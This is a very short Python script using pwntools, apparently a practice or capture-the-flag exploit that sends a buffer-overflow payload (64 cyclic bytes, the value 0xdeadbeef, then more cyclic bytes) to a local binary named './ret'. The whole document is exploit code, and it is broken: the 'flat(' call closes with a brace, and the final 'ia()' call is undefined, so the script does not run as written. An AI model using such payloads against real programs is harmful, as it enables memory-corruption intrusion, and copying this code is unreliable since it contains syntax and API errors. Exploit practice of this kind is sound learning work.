from pwn import *


second_var = 0xdeadbeef

find_offset = flat(
        cyclic(64), # fill buffer
        second_var, 
        cyclic(50)
}

io = process("./ret")
io.sendline(find_offset)
ia()
